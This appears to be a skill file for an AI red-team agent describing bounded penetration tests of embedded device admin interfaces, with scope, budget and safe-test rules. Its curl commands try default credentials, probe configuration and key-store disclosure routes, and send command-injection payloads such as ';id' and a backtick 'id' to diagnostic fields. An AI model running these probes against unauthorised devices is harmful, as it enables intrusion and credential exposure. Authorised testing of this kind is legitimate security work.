---
name: embedded-device-testing
description: Assess embedded device management planes, control APIs, authentication, disclosure, and bounded injection
origin: RedteamOpencode
---

# Embedded Device Testing

## When to Activate

- Routers, cameras, NAS devices, gateways, and other embedded Linux devices expose an HTTP(S) admin interface
- A management page, session-based JSON-RPC control API, or minimal embedded web server is reachable
- The interface may be a full web application or a compact C-based HTTP server
- Use only an in-scope device and retain evidence under `$DIR/scans/`

## Tools

`run_tool nmap`, `run_tool curl`, `run_tool whatweb`, `jq`, `python3`, `awk`, `sed`, `grep`

## Methodology

### 1. Fingerprint the Management Plane

Probe ports 80/443/8080/8443 and add only one observed nonstandard `PORT`; do not turn this into an all-port sweep. Capture the server banner, page title, framework clues, CSRF-token presence, cookies, response shape, and whether links or scripts indicate a full web app or a minimal C-based HTTP server. Save every artifact under `$DIR/scans/`.

```bash
run_tool nmap -Pn -sV -p 80,443,8080,8443,PORT --host-timeout 30s --max-retries 1 HOST > "$DIR/scans/embedded_ports.txt" 2>&1
run_tool whatweb -a 3 --no-errors --max-redirects 2 https://HOST > "$DIR/scans/embedded_fingerprint.txt" 2>&1
run_tool curl -sS -k -D "$DIR/scans/embedded_headers.txt" --connect-timeout 5 --max-time 20 https://HOST/ -o "$DIR/scans/embedded_index.html"
grep -Eio '<title>[^<]*|csrf|token|^server:[[:space:]]*[^[:space:]]+' "$DIR/scans/embedded_index.html" "$DIR/scans/embedded_headers.txt" > "$DIR/scans/embedded_clues.txt" 2>/dev/null; sed -n '1,80p' "$DIR/scans/embedded_index.html" > "$DIR/scans/embedded_head.txt"; awk '/<script|src=|href=/{n++} END{print "linked-resource-lines=" n+0}' "$DIR/scans/embedded_index.html" > "$DIR/scans/embedded_shape.txt"
```

If a different port serves cleartext, repeat only that port with the corresponding HTTP URL; keep the same timeout flags and do not expand the port set.

### 2. Enumerate the Admin Surface

Start with the observed login page, static assets, and linked JavaScript; do not crawl the whole device. Enumerate unauthenticated pages and the JSON-RPC/control endpoint. For a session-based RPC API, record whether login returns a session id usable in later calls. Make one bounded request per concrete discovered endpoint and retain only the response needed for route mapping.

```bash
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/ -o "$DIR/scans/admin_index.html"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/login -o "$DIR/scans/admin_login.html"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/assets/app.js -o "$DIR/scans/admin_bundle.js"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/assets/app.css -o "$DIR/scans/admin_styles.css"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/admin -o "$DIR/scans/admin_unauth.html"
run_tool curl -sS -k -H 'Content-Type: application/json' --connect-timeout 5 --max-time 20 --data '{"jsonrpc":"2.0","method":"session.login","params":{},"id":1}' https://HOST/rpc -o "$DIR/scans/rpc_login_probe.json"
grep -Eo '"/[A-Za-z0-9_./-]+"|/api/[A-Za-z0-9_./-]+|/rpc' "$DIR/scans/admin_bundle.js" > "$DIR/scans/admin_routes.txt"; jq -r '.. | objects | (.session_id? // empty)' "$DIR/scans/rpc_login_probe.json" > "$DIR/scans/rpc_session_id.txt"
```

Use the concrete bundle and RPC paths found in the responses; do not assume the illustrative routes exist. A returned session id is evidence for step 4, not a token to publish.

### 3. Test Default and Static Credentials

Use the discovered form fields or the discovered RPC login method; do not run both variants against one device. Test only this five-pair list: `admin/admin`, `admin/(blank)`, `root/root`, `user/user`, and vendor-neutral `guest/guest`. These are static checks, not a spray; never use a wordlist or brute force. Retain status, redirect, cookie, and response artifacts, and redact secrets in notes.

```bash
run_tool curl -sS -k -c "$DIR/scans/device_session.cookie" -b "$DIR/scans/device_session.cookie" --connect-timeout 5 --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin&password=admin' https://HOST/login -D "$DIR/scans/cred_admin_admin.headers" -o "$DIR/scans/cred_admin_admin.txt"
run_tool curl -sS -k -c "$DIR/scans/device_session.cookie" -b "$DIR/scans/device_session.cookie" --connect-timeout 5 --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=admin&password=' https://HOST/login -D "$DIR/scans/cred_admin_blank.headers" -o "$DIR/scans/cred_admin_blank.txt"
run_tool curl -sS -k -c "$DIR/scans/device_session.cookie" -b "$DIR/scans/device_session.cookie" --connect-timeout 5 --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=root&password=root' https://HOST/login -D "$DIR/scans/cred_root_root.headers" -o "$DIR/scans/cred_root_root.txt"
run_tool curl -sS -k -c "$DIR/scans/device_session.cookie" -b "$DIR/scans/device_session.cookie" --connect-timeout 5 --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=user&password=user' https://HOST/login -D "$DIR/scans/cred_user_user.headers" -o "$DIR/scans/cred_user_user.txt"
run_tool curl -sS -k -c "$DIR/scans/device_session.cookie" -b "$DIR/scans/device_session.cookie" --connect-timeout 5 --max-time 20 -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=guest&password=guest' https://HOST/login -D "$DIR/scans/cred_guest_guest.headers" -o "$DIR/scans/cred_guest_guest.txt"
```

If a lower-privilege candidate succeeds, retain its cookie as `$DIR/scans/low_privilege.cookie`; do not fabricate a privilege difference.

### 4. Check Unauthenticated RPC and Admin Methods

Choose one read-only system-info or device-control/status method from step 2. Call it with no session, an invalid session, and a verified session from a different privilege; never invent a token. Save each body and header set, and record which methods return data or mutate state without authentication. Stop immediately if a probe changes state or destabilizes the service.

```bash
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"system.info","id":1}' https://HOST/rpc -D "$DIR/scans/rpc_no_session.headers" -o "$DIR/scans/rpc_no_session.json"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' -H 'X-Session-Id: invalid-session' --data '{"jsonrpc":"2.0","method":"system.info","id":2}' https://HOST/rpc -D "$DIR/scans/rpc_invalid_session.headers" -o "$DIR/scans/rpc_invalid_session.json"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -b "$DIR/scans/low_privilege.cookie" -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"device.control","params":{"action":"status"},"id":3}' https://HOST/rpc -D "$DIR/scans/rpc_low_privilege.headers" -o "$DIR/scans/rpc_low_privilege.json"
```

A successful response to the no-session call is an access-control finding only if it exposes data or performs a state change; a method-not-found response is not proof of authorization.

### 5. Check Configuration and Credential Disclosure

Probe only concrete export, backup, settings-archive, key-store, and system-info routes. Cap downloads with a range and size limit, inspect only enough to prove exposure, redact values, and never mass-download. Treat a GET to a `/cgi-bin/` writer as read-only; do not submit configuration writes.

```bash
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/config -o "$DIR/scans/config_head.bin"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/backup -o "$DIR/scans/backup_head.bin"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/config.tar -o "$DIR/scans/settings_archive_head.bin"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/cgi-bin/config -o "$DIR/scans/cgi_config_head.bin"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/api/keys -o "$DIR/scans/key_store_head.bin"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/system/info -o "$DIR/scans/system_info.json"
jq -r 'paths(scalars) as $p | select(($p[-1] | tostring | ascii_downcase | test("pass|key|token|secret|credential"))) | $p | join(".")' "$DIR/scans/system_info.json" > "$DIR/scans/sensitive_fields.txt"
```

Report a settings archive or key/password store only when the bounded response proves exposure and the concrete impact; never print full secrets in the report.

### 6. Test Command and Parameter Injection Safely

Use only diagnostic, ping, hostname, or log fields that are actually present. Establish one benign response, then try at most one `;id` and one backtick payload, or a single `${IFS}` variant, per field; encode values so the local shell never expands them. Report only a reproducible server-side differential such as command output or a stable backend error, not client-side reflection alone. Stop on instability.

```bash
run_tool curl -sS -k --connect-timeout 5 --max-time 20 --data-urlencode 'target=example.com' https://HOST/cgi-bin/diagnostic -o "$DIR/scans/injection_baseline.txt"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 --data-urlencode 'target=;id' https://HOST/cgi-bin/diagnostic -o "$DIR/scans/injection_semicolon.txt"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 --data-urlencode 'target=%60id%60' https://HOST/cgi-bin/ping -o "$DIR/scans/injection_backtick.txt"
```

Do not report a payload solely because the response differs; preserve the exact request and response pair and verify the differential is server-side.

### 7. Review Keys, Debug Paths, and Metadata

Check hardcoded API-key clues in local HTML, JavaScript, and headers, then make one bounded request for each concrete debug, status, version, and configuration-download route. Do not probe guessed paths after the budget is reached. For token predictability, repeat one successful login twice with the same discovered mechanism, compare token equality and lengths, and never publish the token. A repeated identical token or obvious counter is evidence; a random-looking token is not a finding.

```bash
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/debug -o "$DIR/scans/debug_endpoint.txt"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/status -o "$DIR/scans/status_endpoint.txt"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 https://HOST/version -o "$DIR/scans/version_endpoint.txt"
run_tool curl -sS -k -r 0-2047 --max-filesize 65536 --connect-timeout 5 --max-time 20 https://HOST/config -o "$DIR/scans/config_download_head.bin"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"session.login","params":{"username":"user","password":"user"},"id":7}' https://HOST/rpc -o "$DIR/scans/rpc_token_1.json"
run_tool curl -sS -k --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"session.login","params":{"username":"user","password":"user"},"id":8}' https://HOST/rpc -o "$DIR/scans/rpc_token_2.json"
grep -Eio 'api[-_ ]?key|token|secret|password|version|firmware' "$DIR/scans/embedded_index.html" "$DIR/scans/admin_bundle.js" "$DIR/scans/embedded_headers.txt" > "$DIR/scans/embedded_key_clues.txt" 2>/dev/null
jq -r '.. | objects | to_entries[] | select(.key | test("session|token|sid"; "i")) | .value' "$DIR/scans/rpc_token_1.json" > "$DIR/scans/rpc_token_1.value"; jq -r '.. | objects | to_entries[] | select(.key | test("session|token|sid"; "i")) | .value' "$DIR/scans/rpc_token_2.json" > "$DIR/scans/rpc_token_2.value"; awk 'FILENAME==ARGV[1] {first=$0; next} {second=$0} END {print "same=" (first==second), "lengths=" length(first) "," length(second)}' "$DIR/scans/rpc_token_1.value" "$DIR/scans/rpc_token_2.value" > "$DIR/scans/session_token_compare.txt"
```

The comparison records only equality and token lengths; never copy the underlying token into a finding.

### 8. Apply Safe-Test Rules

Never factory-reset, flash or upgrade firmware, submit destructive configuration writes, alter routing or access controls, launch a denial-of-service test, run an unbounded loop, brute force, or spray a wordlist. Do not download bulk secrets. A finding requires one reproducible request/response pair and a concrete impact statement; otherwise record the endpoint as not confirmed and stop.

```bash
python3 -c 'print("Confirm-only: preserve the request/response pair, state concrete impact, and stop before any reset, flash, destructive write, bulk download, or load test.")' > "$DIR/scans/safety_ack.txt"
```

## References

`references/vuln-checklists/A01-broken-access-control.md`, `references/vuln-checklists/A02-security-misconfiguration.md`, `references/vuln-checklists/A05-injection.md`, `references/api-security/API02-broken-authentication.md`, `references/api-security/API05-broken-function-authz.md`, `references/api-security/API08-security-misconfiguration.md`, `references/tools/recon/curl.md`, `references/tools/recon/nmap.md`.

## Confirm-Only Rule

Keep reconnaissance, bounded credential checks, disclosure probes, and injection differentials at confirm stage. A finding requires a reproducible request/response pair and concrete impact; do not claim device takeover, persistence, or code execution from a banner or reflection alone. Escalate only a confirmed primitive to exploit-developer at stage=vuln_confirmed.

## Budget

Max 40 target requests per device, 10 credential attempts, and 10 minutes wall-clock.
